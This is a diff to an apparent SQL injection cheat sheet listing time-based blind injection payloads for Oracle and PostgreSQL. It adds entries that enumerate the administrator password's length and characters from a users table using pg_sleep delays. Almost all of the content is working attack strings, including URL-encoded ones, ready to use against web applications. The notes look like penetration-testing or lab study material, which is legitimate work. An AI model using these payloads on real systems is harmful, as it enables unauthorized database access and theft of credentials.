@@ -1,4 +1,4 @@
-Basic blind injections to test for database types:
+Basic blind injections to test for database types with time delays:
 
 ORACLE:
 ' UNION SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE NULL END, NULL FROM dual --
@@ -23,8 +23,11 @@ PostgreSQL:
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
 *basic password enumeration:
-Length check:
-' SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = 1) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users --
+  Length check:
+  ' SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = 1) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users --
+  Chars test:
+  '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+
 
 
 
